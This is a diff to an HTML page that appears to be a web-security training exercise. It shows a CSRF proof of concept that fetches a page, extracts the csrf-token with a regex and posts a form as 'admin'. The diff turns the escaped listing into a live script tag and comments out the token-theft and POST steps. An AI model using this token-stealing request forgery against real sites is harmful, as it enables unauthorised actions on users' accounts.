@@ -24,27 +24,29 @@
         <div class="col-md-7">
             <h2 class="alert">Does it work?</h2>
             <pre><code id="csrf">
-&lt;script&gt;
+<script>
     // request the page containing XRF token
     const level1 = new XMLHttpRequest();
     level1.open('GET', 'http://sc.io/chapter7?code=52');
+    level1.setRequestHeader("Host","sc.io");
     level1.addEventListener('load', e => {
-        let content = level1.responseText;
-        let match = /name\s*="csrf-token"\s*value\s*="([^"]+)"/.exec(content);
-        if (!match) return;
-        console.log(`Obtained XRF token: "${match[1]}"`);
-        const form = new FormData();
-        form.append('username', 'admin');
-        form.append('csrf-token', match[1]);
-        const level2 = new XMLHttpRequest();
-        level2.open('POST', 'http://sc.io/chapter7?code=52', true);
-        level2.addEventListener('load', e => {
-            console.log(level2.responseText);
-        });
-        level2.send(form);
+        console.log(e);
+        // let content = level1.responseText;
+        // let match = /name\s*="csrf-token"\s*value\s*="([^"]+)"/.exec(content);
+        // if (!match) return;
+        // console.log(`Obtained XRF token: "${match[1]}"`);
+        // const form = new FormData();
+        // form.append('username', 'admin');
+        // form.append('csrf-token', match[1]);
+        // const level2 = new XMLHttpRequest();
+        // level2.open('POST', 'http://sc.io/chapter7?code=52', true);
+        // level2.addEventListener('load', e => {
+        //     console.log(level2.responseText);
+        // });
+        // level2.send(form);
     });
     level1.send();
-&lt;/script&gt;
+</script>
             </code></pre>
         </div>
     </div>
